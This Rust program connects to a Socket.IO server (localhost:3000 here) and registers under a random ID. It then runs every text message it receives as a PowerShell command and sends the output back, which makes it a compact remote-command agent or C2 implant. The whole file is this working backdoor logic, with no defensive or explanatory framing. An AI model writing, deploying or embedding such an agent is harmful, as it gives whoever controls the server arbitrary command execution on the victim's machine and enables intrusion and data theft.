use rust_socketio::{ClientBuilder, Payload, RawClient};
use serde_json::{json, Value};
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;
use rand::Rng;

fn main() {

    let callback = |payload: Payload, _socket: RawClient| {
        match payload {
            Payload::Text(values) => {
                for value in values {
                    if let Value::String(text) = value {

                        let output = Command::new("powershell")
                            .arg("-Command")
                            .arg(&text)
                            .output()
                            .expect("Failed to execute PowerShell command");

                        let stdout_str = String::from_utf8_lossy(&output.stdout)
                            .to_string()
                            .replace("\r", "")
                            .replace("\n", "");

                        let response_data = json!({
                            "stdout": stdout_str,
                            "stderr": String::from_utf8_lossy(&output.stderr).to_string(),
                        });

                        _socket.emit("output", response_data)
                            .expect("Failed to emit 'output' event to server");
                    }
                }
            }
            Payload::String(str) => println!("Received: {}", str),
            Payload::Binary(bin_data) => println!("Received bytes: {:#?}", bin_data),
        }
    };

    let socket = ClientBuilder::new("http://localhost:3000")
        .on("message", callback)
        .on("error", |err, _| eprintln!("Error: {:#?}", err))
        .connect()
        .expect("Connection failed");

    let id = format!("{}", rand::random::<u32>());
    socket.emit("register", json!({"id": id})).expect("Failed to emit 'register'");

    loop {
        thread::sleep(Duration::from_secs(1));
    }
}